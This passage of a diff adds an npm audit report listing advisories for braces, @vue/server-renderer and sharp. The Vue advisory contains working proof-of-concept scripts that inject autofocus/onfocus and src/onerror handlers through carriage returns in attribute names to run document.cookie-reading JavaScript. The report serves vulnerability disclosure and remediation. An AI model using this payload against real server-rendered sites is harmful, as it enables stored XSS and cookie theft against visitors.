+      "cwe": [
+        "CWE-122"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c"
+    },
+    "1240992": {
+      "findings": [
+        {
+          "version": "3.0.3",
+          "paths": [
+            ".>vitest>vite>sass>@parcel/watcher>micromatch>braces"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93687\n- https://github.com/micromatch/braces/issues/70\n- https://github.com/micromatch/braces/blob/3.0.3/lib/compile.js#L49-L53\n- https://github.com/micromatch/braces/blob/3.0.3/lib/expand.js#L102-L105\n- https://github.com/micromatch/braces/blob/3.0.3/lib/parse.js#L38-L40\n- https://www.vulncheck.com/advisories/braces-through-3.0.3-stack-overflow-via-deeply-nested-patterns\n- https://github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+      "created": "2026-09-18T18:31:41.000Z",
+      "id": 1240992,
+      "npm_advisory_id": null,
+      "overview": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+      "reported_by": null,
+      "title": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93687"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "braces",
+      "vulnerable_versions": "<=3.0.3",
+      "github_advisory_id": "GHSA-vfj7-8cjw-p6xm",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-02T22:36:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm"
+    },
+    "1241259": {
+      "findings": [
+        {
+          "version": "3.3.4",
+          "paths": [
+            "src__extension>plasmo>@plasmohq/parcel-config>@plasmohq/parcel-transformer-vue>vue>@vue/server-renderer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vuejs/core/security/advisories/GHSA-g2v6-rqmx-r4w6\n- https://github.com/vuejs/core/pull/15266\n- https://github.com/vuejs/core/commit/a2b40db9a83b36ed9da3a16403cf8f040262d73f\n- https://github.com/vuejs/core/releases/tag/v3.5.42\n- https://github.com/vuejs/core/releases/tag/v3.6.0-rc.6\n- https://github.com/advisories/GHSA-g2v6-rqmx-r4w6",
+      "created": "2026-10-05T22:50:55.000Z",
+      "id": 1241259,
+      "npm_advisory_id": null,
+      "overview": "## Description\n\n`@vue/server-renderer` was investigated specifically because it's the one place in Vue where template rendering output becomes a real HTTP response body -- a genuine server-side trust boundary, unlike client-side rendering which only ever affects the same browser session that's already running the app's own JS.\n\n`ssrRenderAttrs()` (in `packages/server-renderer/src/helpers/ssrRenderAttrs.ts`) is what compiled SSR output calls for something like `<div v-bind=\"userObject\">`. It loops over the object's own keys and, for each one, renders it as an HTML attribute:\n\n```ts\nexport function ssrRenderDynamicAttr(\n  key: string,\n  value: unknown,\n  tag?: string,\n): string {\n  if (!isRenderableAttrValue(value)) {\n    return ``\n  }\n  const attrKey = ...\n  if (isBooleanAttr(attrKey) || ...) {\n    return includeBooleanAttr(value) ? ` ${attrKey}` : ``\n  } else if (isSSRSafeAttrName(attrKey)) {\n    return value === '' ? ` ${attrKey}` : ` ${attrKey}=\"${escapeHtml(value)}\"`\n  } else {\n    console.warn(`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${attrKey}`)\n    return ``\n  }\n}\n```\n\nThe value always goes through `escapeHtml()` -- that part is correctly and consistently applied everywhere in this file. But the attribute name (`attrKey`) is only checked against a character blacklist, then spliced directly into the output with no escaping of its own:\n\n```ts\n// packages/shared/src/domAttrConfig.ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u0020]/\n\nexport function isSSRSafeAttrName(name: string): boolean {\n  if (attrValidationCache.hasOwnProperty(name)) {\n    return attrValidationCache[name]\n  }\n  const isUnsafe = unsafeAttrCharRE.test(name)\n  if (isUnsafe) {\n    console.error(`unsafe attribute name: ${name}`)\n  }\n  return (attrValidationCache[name] = !isUnsafe)\n}\n```\n\nThat blacklist covers: `>`, `/`, `=`, `\"`, apostrophe, tab (U+0009), line feed (U+000A), form feed (U+000C), and space (U+0020). It does not cover U+000D -- carriage return (CR, written as `\\r` in JS).\n\nThat matters because of how browsers actually parse HTML. Per the WHATWG HTML parsing spec, the very first step (\"preprocessing the input stream\") converts every `\\r` not followed by `\\n` into a `\\n` before the tokenizer even starts. So a raw `\\r` sitting inside what Vue intends as a single attribute name gets turned into a real line feed by the browser -- and a line feed is one of the characters that terminates an attribute name and starts a new one. The blacklist checks the string as Vue sees it before the browser gets to reinterpret it, and that's exactly the gap.\n\nBelow is a fresh clone of this repo, confirming the exact commit, the exact vulnerable line, and zero modification to the source:\n\n<img width=\"781\" height=\"336\" alt=\"poc1\" src=\"https://github.com/user-attachments/assets/f4b92955-9a8f-4700-8c51-38ee46912de8\" />\n\n## Prrof\n\nThe real, unmodified  ssrRenderAttrs()  from the published  @vue/server-renderer@3.5.41  package was tested. The source at HEAD and the upcoming  v3.6.0-rc.2  tag were also checked, and the same vulnerable regular expression was present in both; no branch containing a fix was identified.\n\nFull script, saved as `poc.mjs` (GitHub doesn't let me attach `.mjs` directly, so the complete file is here):\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport { parseFragment } from 'parse5';\n\n// This is exactly what compiled SSR output calls for `<div v-bind=\"userObject\">`\n// -- the real, unmodified, published ssrRenderAttrs function.\n// Full attack chain: the key itself contains ONLY letters, digits, and a\n// bare \\r (carriage return) -- no '>', '/', '=', '\"', \"'\", tab, LF, FF, or\n// space anywhere, so isSSRSafeAttrName() considers it fully safe. The value\n// is attacker-controlled JavaScript, delivered as the genuine value of the\n// LAST \\r-separated fragment, which Vue's own template naturally appends via\n// `=\"${escapeHtml(value)}\"` immediately after the key.\nconst maliciousKey = 'x\\rautofocus\\ronfocus';\nconst props = {\n  [maliciousKey]: 'alert(document.cookie)',\n};\n\nconst rawAttrString = ssrRenderAttrs(props);\nconsole.log('=== Raw string produced by the real ssrRenderAttrs() ===');\nconsole.log(JSON.stringify(rawAttrString));\nconsole.log();\nconsole.log('=== As it would literally appear in the HTML response ===');\nconsole.log(rawAttrString.replace(/\\r/g, '\\\\r').replace(/\\n/g, '\\\\n\\n'));\n\nconst fullHtml = `<div${rawAttrString}>content</div>`;\nconsole.log();\nconsole.log('=== Full element HTML ===');\nconsole.log(JSON.stringify(fullHtml));\n\n// Now parse this EXACT output with parse5 -- a real, spec-compliant HTML5\n// parser (the same parsing algorithm real browsers implement, including the\n// \\r\\n -> \\n input-preprocessing normalization step).\nconst fragment = parseFragment(fullHtml);\nconst div = fragment.childNodes.find(n => n.tagName === 'div');\nconsole.log();\nconsole.log('=== How a real HTML5 parser (parse5) actually interprets this ===');\nconsole.log('Attributes parsed on the <div>:');\nfor (const attr of div.attrs) {\n  console.log(`  ${JSON.stringify(attr.name)} = ${JSON.stringify(attr.value)}`);\n}\n\nconst injectedHandler = div.attrs.find(a => a.name === 'onfocus');\nconst injectedAutofocus = div.attrs.find(a => a.name === 'autofocus');\nconsole.log();\nif (injectedHandler && injectedAutofocus) {\n  console.log('*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***');\n  console.log(`*** onfocus value: ${JSON.stringify(injectedHandler.value)} ***`);\n  console.log('*** This element will execute the attacker JS automatically on page load, no user interaction needed. ***');\n} else {\n  console.log('Not confirmed.');\n}\n```\n\nThis is a fresh `npm install vue@3.5.41 @vue/server-renderer@3.5.41 parse5` -- the real, currently-published packages, not anything modified:\n\n<img width=\"831\" height=\"531\" alt=\"poc2\" src=\"https://github.com/user-attachments/assets/ea350948-4c93-45a3-b21a-f21dc7f90d29\" />\n\nReal, captured output:\n\n```\n=== Raw string produced by the real ssrRenderAttrs() ===\n\" x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\"\"\n\n=== Full element HTML ===\n\"<div x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\">content</div>\"\n\n=== How a real HTML5 parser (parse5) actually interprets this ===\nAttributes parsed on the <div>:\n  \"x\" = \"\"\n  \"autofocus\" = \"\"\n  \"onfocus\" = \"alert(document.cookie)\"\n\n*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***\n*** onfocus value: \"alert(document.cookie)\" ***\n```\n\n<img width=\"834\" height=\"897\" alt=\"poc3\" src=\"https://github.com/user-attachments/assets/a92f9c5b-e30d-4968-9ec1-8969628c6437\" />\n<img width=\"834\" height=\"896\" alt=\"poc4\" src=\"https://github.com/user-attachments/assets/a397cd3f-8eb3-49af-9604-a31a8bcdb2ea\" />\n\nThe single attribute name Vue intended to render safely -- `x\\rautofocus\\ronfocus` -- gets parsed by any real browser as three separate things: an empty `x` attribute, a real `autofocus` boolean attribute, and a real `onfocus=\"alert(document.cookie)\"` event handler. `autofocus` means the element receives focus automatically on page load, which fires the `focus` event immediately, which runs the injected JavaScript -- no click, no hover, no user interaction of any kind required.\n\nThis behavior was confirmed not to be specific to the payload by first isolating the mechanism with a minimal case (`\"foo\\rbar\"` as the key, no other special characters at all), which parse5 also split into two genuine separate attributes (`foo=\"\"` and `bar=\"...\"`), before building the full self-triggering payload above.\n\nTo go beyond the parser-level proof, there is a second script that calls the real `ssrRenderAttrs()`, captures its exact return value programmatically, and writes that unmodified byte sequence directly into an HTML file on disk -- no HTML was hand-typed anywhere in this step. Full script, saved as `generate_real_poc.mjs`:\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport fs from 'fs';\n\n// This is the ACTUAL, unmodified ssrRenderAttrs() from the real, installed\n// @vue/server-renderer@3.5.41 -- nothing hand-typed below this line is HTML,\n// it is Vue's own function's real return value, captured programmatically.\nconst maliciousKey = 'x\\rsrc\\ronerror';\nconst props = { [maliciousKey]: 'alert(\"REAL Vue SSR output executed this -- cookie: \" + document.cookie)' };\n\nconst vueOutput = ssrRenderAttrs(props);\n\nconsole.log('=== Vue\\'s real ssrRenderAttrs() returned exactly this string ===');\nconsole.log(JSON.stringify(vueOutput));\n\n// Build the full page around Vue's UNMODIFIED output -- the <img ...> tag\n// content between the angle brackets is copied byte-for-byte from vueOutput,\n// not retyped.\nconst html = `<!DOCTYPE html>\n<html>\n<head><title>Vue SSR PoC -- byte-for-byte Vue output</title></head>\n<body>\n<h3>Everything inside the &lt;img&gt; tag below was written to this file\nprogrammatically from the real return value of <code>ssrRenderAttrs()</code>\nin the actual installed <code>@vue/server-renderer@3.5.41</code> package.\nNo HTML was hand-typed for the tag itself.</h3>\n<p>Exact JSON-escaped string Vue's function returned (see generate_real_poc.mjs, run right before this file was written):</p>\n<pre id=\"vue-output-proof\">${vueOutput.replace(/</g, '&lt;')}</pre>\n<hr>\n<img${vueOutput}>\n</body>\n</html>\n`;\n\nconst outPath = '/Users/onevilx/Desktop/vue-ssr-xss-poc-real.html';\nfs.writeFileSync(outPath, html);\nconsole.log('\\nWrote', outPath);\nconsole.log('Bytes inside the <img...> tag are Vue\\'s real, unmodified return value.');\n```\n\nOpening that generated file in a real browser fires the payload automatically:\n\n<img width=\"1666\" height=\"449\" alt=\"poc5\" src=\"https://github.com/user-attachments/assets/251bd830-634f-4cd0-bf79-849bbc07ec9a\" />\n\nDev tools on that same page confirm the browser genuinely parsed three separate attributes (`x`, `src`, `onerror`), matching the on-page proof text that was written directly from Vue's real return value:\n\n<img width=\"1348\" height=\"400\" alt=\"poc6\" src=\"https://github.com/user-attachments/assets/b19d6ff0-ecaa-45f3-9149-9f3d0d4faacb\" />\n\nWhether this affects client-side (non-SSR) Vue rendering was also checked: it doesn't, and I want to be upfront about that limit too. Client-side Vue sets dynamic attributes via the DOM `setAttribute()` API, which validates the name against the HTML QName grammar and throws a `DOMException` for characters like `\"` (I found an existing, unrelated open issue -- #13944 -- that confirms this behavior). That's a fundamentally different code path with its own validation, and I have not found a way to reach this specific bug through it. This is specifically and only an `@vue/server-renderer` (SSR) issue.\n\n## Impact\n\nThis requires an application to bind an object whose keys (not just values) come from a source the developer doesn't fully control, via `v-bind=\"object\"` or the equivalent compiled form. I want to be honest about how common that is: binding untrusted values into attributes is the standard, everyday Vue pattern that's already safely handled by `escapeHtml()`. Binding untrusted keys is less universal, but it's a real, documented, supported Vue feature, not a misuse of the framework -- and it's exactly the scenario `isSSRSafeAttrName()` exists to defend, which tells me it's already inside your own threat model for this file, just not fully closed. Realistic examples: a CMS or form-builder feature where field/attribute names are configurable by a less-trusted role and gets rendered via SSR to other users; a component that spreads a validated-elsewhere config object onto a root element; any dynamic-attributes helper that takes a plain object where both keys and values may originate from external data (a database record, an API response, a query string parsed into an object).\n\nWhere it's reachable, the impact is a complete, self-triggering stored XSS in server-rendered HTML -- the injected `autofocus`/`onfocus` payload runs the moment the page loads, for every visitor who receives that server-rendered output, with no interaction needed. That's a real trust-boundary break in a security-relevant helper whose entire job is making data safe to render.\n\n## Suggested fix\n\nAdd U+000D (carriage return) to `unsafeAttrCharRE` in `packages/shared/src/domAttrConfig.ts`:\n\n```ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u000d\\u0020]/\n```\n\nDouble-checking against the full WHATWG \"ASCII whitespace\" definition (tab, LF, FF, CR, space -- all five) rather than enumerating characters one at a time would help, since that's exactly the kind of list that's easy to leave a gap in, which is what happened here.",
+      "reported_by": null,
+      "title": "@vue/server-renderer: XSS via missing CR in attribute-name blacklist",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@vue/server-renderer",
+      "vulnerable_versions": "<3.5.42",
+      "github_advisory_id": "GHSA-g2v6-rqmx-r4w6",
+      "recommendation": "Upgrade to version 3.5.42 or later",
+      "patched_versions": ">=3.5.42",
+      "updated": "2026-10-05T22:50:56.000Z",
+      "cvss": {
+        "score": 7.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6"
+    },
+    "1241331": {
+      "findings": [
+        {
+          "version": "0.33.5",
+          "paths": [
+            "src__extension>plasmo>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w\n- https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236\n- https://github.com/lovell/sharp/releases/tag/v0.35.5\n- https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241\n- https://www.cve.org/CVERecord?id=CVE-2026-96889\n- https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+      "created": "2026-10-06T13:43:57.000Z",
+      "id": 1241331,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+      "reported_by": null,
+      "title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.5",
+      "github_advisory_id": "GHSA-wq5f-xc86-pv6w",
+      "recommendation": "Upgrade to version 0.35.5 or later",
+      "patched_versions": ">=0.35.5",
+      "updated": "2026-10-06T13:43:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-416",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 9,
+      "high": 6,
+      "critical": 0
+    },
+    "dependencies": 1032,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1032
+  }
+}
